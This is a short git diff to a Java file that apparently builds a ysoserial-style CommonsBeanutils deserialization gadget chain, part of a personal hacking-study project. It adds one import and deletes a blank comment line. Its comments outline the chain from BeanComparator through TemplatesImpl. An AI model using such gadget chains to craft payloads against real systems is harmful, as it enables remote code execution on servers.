@@ -7,6 +7,7 @@ import com.xjjlearning.hack.java.ysoserial.payloads.util.ClassUtil;
 import com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil;
 import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
 import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.beanutils.PropertyUtils;
 
 import java.util.Optional;
 import java.util.PriorityQueue;
@@ -30,7 +31,6 @@ public class CommonsBeanutil {
         // -> BeanComparator.compare()
         // -> PropertyUtils.getProperty(templates, "outputProperties");
         // -> TemplatesImpl.getOutputProperties() -> newTransformer() -> ...
-        //
         BeanComparator comparator = new BeanComparator();
 
         // 如果在这里加这个而不是使用反射, 则会在下面offer处执行compare, 进而执行我们的getProperty方法, 但是Integer没有所以会报错
